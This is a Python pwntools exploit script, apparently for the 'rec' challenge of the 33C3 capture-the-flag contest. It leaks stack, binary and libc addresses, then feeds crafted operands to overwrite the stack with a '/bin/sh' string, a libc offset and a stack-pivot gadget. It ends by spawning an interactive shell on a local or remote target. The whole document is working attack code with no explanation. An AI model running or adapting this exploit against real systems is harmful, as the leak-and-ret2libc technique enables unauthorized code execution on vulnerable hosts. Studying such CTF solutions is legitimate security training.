#!/usr/bin/env python

from pwn import *
import sys

def read_note():
	r.sendline('1')
	r.recvuntil("Your note: ")
	return r.recvuntil('\n\n').strip()

def exploit(r):
	r.recvuntil('> ')
	leak = read_note()
	stack = u32(leak[:4])
	binary = u32(leak[4:8]) - 0x6fb
	libc = u32(leak[8:12])
	libc_base = libc - 0x01b2d60 - 0x1000
	log.info("Stack : " + hex(stack))
	log.info("Binary: " + hex(binary))
	log.info("libc  : " + hex(libc))
	log.info("libc base: " + hex(libc_base))



	r.sendline('2')
	r.recvuntil('Operator: ')
	r.sendline('S')
	r.recvuntil('Operand: ')

	for i in range(100):
		if i == 0x5e:
			r.sendline('-' + str((libc_base + 0x0003ada0 - 0x529 + 0x20 + 0x10 + 0x10 - 7 ^ 0xffffffff) + 1))
		elif i == 0x5d:
			r.sendline('-' + str((stack - 780 ^ 0xffffffff) + 1))
#			r.sendline('-' + str((libc_base + 0x0003ada0 - 0x529 + 0x20 + 0x10 + 0x10 - 7 ^ 0xffffffff) + 1))
		elif i == 0x5b:
			r.sendline(str(u32('/bin')))
		elif i == 0x5a:
			r.sendline(str(u32('/sh\x00')))
		elif i == 0x60:
			r.sendline('-' + str((stack - 804 ^ 0xffffffff) + 1))
		elif i == 0x63:
			r.sendline(str(binary + 0xfae)) # lea esp, dword ptr [ebp - 8] ; pop ecx ; pop ebx ; pop ebp ; lea esp, dword ptr [ecx - 4] ; ret)
		else:
			r.sendline(str(i))
		r.recvuntil('Operand: ')

	r.sendline('.')

	r.recvuntil('> ')
	r.sendline('5')
	r.send("\n")


	r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 2:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/33c3/rec/rec'])
        print util.proc.pidof(r)
        pause()
        exploit(r)